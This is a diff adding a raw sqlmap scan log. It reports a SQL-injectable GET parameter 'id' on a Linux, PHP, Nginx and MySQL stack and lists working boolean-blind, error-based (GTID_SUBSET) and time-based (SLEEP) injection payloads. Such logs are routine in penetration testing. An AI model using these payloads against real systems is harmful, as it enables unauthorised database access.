@@ -1,0 +1,18 @@
+sqlmap identified the following injection point(s) with a total of 341 HTTP(s) requests:
+---
+Parameter: id (GET)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: id=1 AND 8478=8478
+
+    Type: error-based
+    Title: MySQL >= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)
+    Payload: id=1 AND GTID_SUBSET(CONCAT(0x716b716271,(SELECT (ELT(9125=9125,1))),0x716a6a7071),9125)
+
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: id=1 AND (SELECT 4020 FROM (SELECT(SLEEP(5)))XSVD)
+---
+web server operating system: Linux Ubuntu
+web application technology: PHP 5.6.40, Nginx 1.19.0
+back-end DBMS: MySQL >= 5.6
